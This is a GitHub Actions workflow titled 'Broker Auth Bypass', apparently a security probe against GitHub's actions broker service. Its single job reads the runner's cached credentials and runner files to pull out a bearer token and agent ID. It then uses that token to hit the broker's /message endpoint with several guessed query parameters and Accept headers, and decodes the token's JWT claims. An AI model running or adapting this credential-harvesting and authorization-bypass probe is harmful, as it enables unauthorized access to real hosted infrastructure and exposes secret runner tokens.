name: Broker Auth Bypass
on: workflow_dispatch
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Authenticated broker access
        run: |
          BROKER="https://broker.actions.githubusercontent.com"
          CREDS="/home/runner/actions-runner/cached/2.335.1/.credentials"
          TOKEN=$(python3 -c "import json; d=json.load(open('$CREDS')); print(d.get('Data',{}).get('token',''))" 2>/dev/null)
          RUNNER_FILE="/home/runner/actions-runner/cached/2.335.1/.runner"
          AGENT_ID=$(python3 -c "import json; d=json.load(open('$RUNNER_FILE')); print(d.get('AgentId',''))" 2>/dev/null)
          
          echo "Agent ID: $AGENT_ID"
          echo "Token length: ${#TOKEN}"
          
          # The runner calls GET /message with session and runner info
          echo "=== /message with query params ==="
          for PARAMS in \
            "?sessionId=test" \
            "?runnerId=$AGENT_ID" \
            "?lastMessageId=0" \
            "?runnerId=$AGENT_ID&lastMessageId=0" \
            "?sessionId=00000000-0000-0000-0000-000000000000"; do
            RESP=$(curl -s -w "\n%{http_code}" --max-time 5 \
              -H "Authorization: Bearer $TOKEN" \
              "$BROKER/message$PARAMS" 2>/dev/null)
            STATUS=$(echo "$RESP" | tail -1)
            BODY=$(echo "$RESP" | head -1)
            echo "  $PARAMS: $STATUS - ${BODY:0:120}"
          done
          
          echo ""
          echo "=== Try /message with Accept headers ==="
          for ACCEPT in "application/json" "text/event-stream" "application/x-ndjson"; do
            RESP=$(curl -s -w "\n%{http_code}" --max-time 3 \
              -H "Authorization: Bearer $TOKEN" \
              -H "Accept: $ACCEPT" \
              "$BROKER/message" 2>/dev/null)
            STATUS=$(echo "$RESP" | tail -1)
            BODY=$(echo "$RESP" | head -1)
            echo "  Accept=$ACCEPT: $STATUS - ${BODY:0:100}"
          done
          
          echo ""
          echo "=== Decode runner token JWT (check claims/scope) ==="
          python3 -c "
          import json, base64
          token = open('$CREDS').read()
          d = json.loads(token)
          tok = d.get('Data',{}).get('token','')
          # JWT has 3 parts separated by dots
          parts = tok.split('.')
          if len(parts) >= 2:
              # Add padding
              payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
              decoded = json.loads(base64.urlsafe_b64decode(payload))
              for k,v in decoded.items():
                  val = str(v)
                  if len(val) > 100:
                      val = val[:100] + '...'
                  print(f'{k}: {val}')
          else:
              print(f'Not a JWT (parts: {len(parts)})')
          " 2>/dev/null
